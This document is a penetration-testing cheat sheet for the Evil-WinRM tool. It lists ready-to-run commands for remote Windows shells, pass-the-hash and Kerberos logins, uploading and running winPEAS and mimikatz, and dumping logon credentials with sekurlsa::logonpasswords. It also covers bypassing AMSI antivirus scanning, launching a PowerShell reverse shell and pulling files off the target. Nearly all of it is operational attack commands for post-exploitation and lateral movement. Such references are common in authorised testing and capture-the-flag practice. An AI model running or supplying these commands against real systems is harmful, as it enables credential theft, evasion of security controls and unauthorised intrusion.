# Evil-WinRM Reference

**Tags:** #winrm #windows #shell #post-exploitation
**Port:** 5985 (HTTP) / 5986 (HTTPS)

---

## Basic Connections

```bash
# Password auth
evil-winrm -i $TARGET -u $USER -p $PASS

# Pass-the-Hash (NTLM)
evil-winrm -i $TARGET -u $USER -H NTLMHASH

# With SSL (5986)
evil-winrm -i $TARGET -u $USER -p $PASS -S

# With certificate (ADCS-issued)
evil-winrm -i $TARGET -c certificate.pem -k priv-key.pem -S

# With domain
evil-winrm -i $TARGET -u $DOMAIN\\$USER -p $PASS
```

## File Transfer

```bash
# Upload file (evil-winrm session)
upload /local/path/file.exe
upload /opt/tools/winPEAS.exe C:\Windows\Temp\winPEAS.exe

# Download file
download C:\Windows\Temp\passwords.txt /local/path/
download C:\Users\user\Desktop\flag.txt

# Upload entire directory
upload /opt/tools/
```

## Load Scripts & Executables

```bash
# Start with local script folder and exe folder
evil-winrm -i $TARGET -u $USER -p $PASS \
  -s /opt/evil-winrm-scripts/ \
  -e /opt/evil-winrm-exes/ \
  -l    # enable logging

# In session: load scripts
Bypass-4MSI           # Bypass AMSI
menu                  # Show available functions
Invoke-Mimikatz
Invoke-PowerShellTcp  # Reverse shell

# Execute uploaded binaries
Invoke-Binary /opt/evil-winrm-exes/winPEAS.exe
```

## AMSI Bypass

```bash
# In evil-winrm session
menu                  # Shows 'Bypass-4MSI' and others
Bypass-4MSI           # Bypass AMSI for current session
```

## PowerShell Commands in Session

```powershell
# Upload mimikatz and dump
upload /opt/mimikatz.exe
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Run scripts directly
IEX (Get-Content .\PowerView.ps1 -Raw)
Get-DomainUser

# Port forward via session
# (limited — use chisel for full tunneling)
```

## Kerberos Auth

```bash
export KRB5CCNAME=/tmp/Administrator.ccache
evil-winrm -i $TARGET -r $DOMAIN
```

## Check if WinRM is Open

```bash
netexec winrm $TARGET -u $USER -p $PASS
nmap -p 5985,5986 $TARGET
curl http://$TARGET:5985/wsman
```

## Related Notes

- [[06-Lateral-Movement/INDEX]] — Lateral movement via WinRM
- [[00-Quick-Reference/Mimikatz]] — After getting WinRM shell
- [[05-Post-Exploitation/Windows-PrivEsc/INDEX]] — PrivEsc after WinRM
